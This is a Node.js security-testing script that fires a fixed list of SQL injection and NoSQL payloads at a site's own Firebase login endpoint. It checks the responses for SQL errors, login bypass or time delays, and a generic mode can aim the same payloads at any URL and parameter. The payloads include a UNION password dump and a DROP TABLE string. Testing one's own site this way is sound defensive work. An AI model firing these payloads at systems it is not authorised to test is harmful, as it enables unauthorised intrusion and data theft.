#!/usr/bin/env node
/* ─── SQL INJECTION ATTACK LAB ─────────────────────────────────────────────
 * Default target: the Firebase auth endpoint behind public/login.html — the
 * only place this site sends user input to a server. Classic SQLi payloads
 * (+ two NoSQL payloads) are fired at it and every response is inspected for
 * SQL error signatures, auth bypass, or time delays.
 *
 * Generic mode — point the same attack at any SQL-backed page later:
 *   node scripts/security/sqli.mjs --url https://example.com/login --param email
 *   node scripts/security/sqli.mjs --url https://example.com/search --param q
 *   node scripts/security/sqli.mjs --url https://api.example.com/user --param id --method POST --json
 *
 * LIMITED RUN: a fixed payload set (~14 requests) is sent; nothing is written,
 * no destructive payload is executed beyond its literal string form.
 * ───────────────────────────────────────────────────────────────────────── */
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const here = dirname(fileURLToPath(import.meta.url));
const args = process.argv.slice(2);
const value = (name, fallback) => { const i = args.indexOf(name); return i >= 0 && args[i + 1] && !args[i + 1].startsWith('--') ? args[i + 1] : fallback; };
const flag = name => args.includes(name);

const targetUrl = value('--url', '');
const param = value('--param', '');
const method = value('--method', 'GET').toUpperCase();
const useJson = flag('--json');

// Signatures of a real SQL engine complaining about our input.
const SQL_SIG = /sql syntax|sqlite|mysql|mysqli|postgres|pg_|odbc|sqlstate|unclosed quotation|quoted string not properly terminated|ORA-\d{4,5}|syntax error at or near|you have an error in your sql|warning.*mysql|supplied argument is not a valid|column ['"].*['"] (was )?not found|relation ['"].*['"] (was )?not found|table ['"][^'"]*['"] (doesn'?t|does not) exist|unknown column/i;

// Payload set: string-typed payloads go into the field under test; the two
// NoSQL entries swap the field for a JSON object (type-confusion attempt).
const PAYLOADS = [
  { label: 'Tautology', value: "' OR '1'='1" },
  { label: 'Tautology + comment', value: "' OR '1'='1' --" },
  { label: 'OR 1=1 (hash)', value: "' OR 1=1#" },
  { label: 'Credential bypass', value: "admin'--" },
  { label: 'UNION NULL probe', value: "' UNION SELECT NULL--" },
  { label: 'UNION dump', value: "' UNION SELECT username,password FROM users--" },
  { label: 'DROP TABLE (inert)', value: "'; DROP TABLE users;--" },
  { label: 'False condition', value: "' AND '1'='2" },
  { label: 'Quote break', value: "'" },
  { label: 'Error-based extract', value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--" },
  { label: 'Time-based SLEEP', value: "' OR SLEEP(5)--", timeProbe: true },
  { label: 'NoSQL $ne (email)', value: { $ne: null } },
  { label: 'NoSQL $ne (password)', field: 'password', value: { $ne: null } },
];

const sleep = ms => new Promise(r => setTimeout(r, ms));
const scan = text => SQL_SIG.test(text);

async function post(url, body) {
  const started = Date.now();
  try {
    const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
    const text = await res.text();
    return { status: res.status, text, ms: Date.now() - started };
  } catch (e) {
    return { status: 0, text: `NETWORK: ${e.message}`, ms: Date.now() - started };
  }
}

function report(rows) {
  for (const r of rows) {
    const flags = [r.sqlSig && 'SQL-ERROR', r.bypass && 'AUTH-BYPASS', r.slow && 'TIME-DELAY'].filter(Boolean);
    const code = r.code || `HTTP ${r.status}`;
    console.log(`  ${r.label.padEnd(24)} → ${code.padEnd(28)} ${String(r.ms + ' ms').padStart(8)}  ${flags.join(' ') || ''}`);
  }
}

function verdict(found) {
  console.log('\n── Verdict ─────────────────────────────────────────────────');
  if (found.length) {
    console.log(`VULNERABLE — ${found.join('; ')}`);
    process.exitCode = 2;
  } else {
    console.log('NOT VULNERABLE — no SQL error signature, no auth bypass, no time delay.');
    console.log('Every payload was treated as a literal string: the target speaks JSON');
    console.log('(Firebase Auth) and structured queries (Firestore / NoSQL), so there');
    console.log('is no SQL engine that could interpret the injection.');
  }
}

// ─── FIREBASE MODE (default) ───────────────────────────────────────────────
if (!targetUrl) {
  const source = readFileSync(join(here, '..', '..', 'public', 'js', 'firebase.js'), 'utf8');
  const apiKey = /apiKey:\s*'([^']+)'/.exec(source)?.[1];
  if (!apiKey) { console.error('Could not read the Firebase web API key from public/js/firebase.js.'); process.exit(1); }
  const endpoint = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${apiKey}`;

  console.log('SQL injection lab — Firebase target (login.html backend)');
  console.log(`  endpoint : identitytoolkit.googleapis.com · accounts:signInWithPassword`);
  console.log(`  payloads : ${PAYLOADS.length} · limited run\n`);

  const base = await post(endpoint, { email: 'baseline@example.com', password: 'wrongpass123', returnSecureToken: true });
  let baseParsed = {};
  try { baseParsed = JSON.parse(base.text); } catch { /* non-json response */ }
  const baseCode = baseParsed?.error?.message || (base.status === 200 ? 'OK (idToken issued)' : `HTTP ${base.status}`);
  console.log(`  baseline                 → ${baseCode.padEnd(28)} ${base.ms + ' ms'}  (benign wrong password)\n`);

  const rows = [];
  for (const p of PAYLOADS) {
    const body = { email: 'baseline@example.com', password: 'wrongpass123', returnSecureToken: true };
    body[p.field || 'email'] = p.value;
    const r = await post(endpoint, body);
    let parsed = {};
    try { parsed = JSON.parse(r.text); } catch { /* not json */ }
    rows.push({
      label: p.label,
      status: r.status,
      code: parsed?.error?.message || (r.status === 200 ? 'OK (idToken issued)' : `HTTP ${r.status}`),
      ms: r.ms,
      sqlSig: scan(r.text),
      bypass: !!parsed.idToken,
      slow: p.timeProbe && r.ms > base.ms + 3500,
    });
    await sleep(200);
  }

  report(rows);
  const found = [];
  if (rows.some(r => r.sqlSig)) found.push('SQL error signature in response');
  if (rows.some(r => r.bypass)) found.push('payload issued a session token (login bypass)');
  if (rows.some(r => r.slow)) found.push('time-based delay observed');
  verdict(found);
  process.exit();
}

// ─── GENERIC HTTP MODE ─────────────────────────────────────────────────────
if (!param) { console.error('Generic mode needs --param (e.g. --url https://site/login --param email)'); process.exit(1); }

async function send(url, payload) {
  const started = Date.now();
  try {
    let res;
    if (method === 'GET') {
      const u = new URL(url);
      u.searchParams.set(param, String(payload));
      res = await fetch(u);
    } else {
      const body = useJson ? JSON.stringify({ [param]: payload }) : new URLSearchParams({ [param]: String(payload) }).toString();
      res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': useJson ? 'application/json' : 'application/x-www-form-urlencoded' },
        body,
      });
    }
    const text = await res.text();
    return { status: res.status, text, ms: Date.now() - started };
  } catch (e) {
    return { status: 0, text: `NETWORK: ${e.message}`, ms: Date.now() - started };
  }
}

console.log(`SQL injection lab — generic target`);
console.log(`  endpoint : ${method} ${targetUrl} · param "${param}"`);
console.log(`  payloads : ${PAYLOADS.length} · limited run\n`);

const base = await send(targetUrl, 'baselineprobe');  console.log(`  ${'baseline'.padEnd(24)} → ${('HTTP ' + base.status).padEnd(28)} ${String(base.ms + ' ms').padStart(8)}  len ${base.text.length}\n`);

const rows = [];
for (const p of PAYLOADS) {
  if (typeof p.value === 'object') continue; // JSON type-confusion only meaningful for the Firebase API
  const r = await send(targetUrl, p.value);
  rows.push({
    label: p.label,
    status: r.status,
    code: `HTTP ${r.status}`,
    ms: r.ms,
    sqlSig: scan(r.text),
    bypass: false,
    slow: p.timeProbe && r.ms > base.ms + 3500,
    lenDelta: Math.abs(r.text.length - base.text.length),
  });
  await sleep(200);
}

report(rows);
const found = [];
if (rows.some(r => r.sqlSig)) found.push('SQL error signature in response');
if (rows.some(r => r.slow)) found.push('time-based delay observed');
if (rows.some(r => r.status >= 500 && base.status < 500)) found.push('server error triggered by payload (possible SQL crash)');
verdict(found);
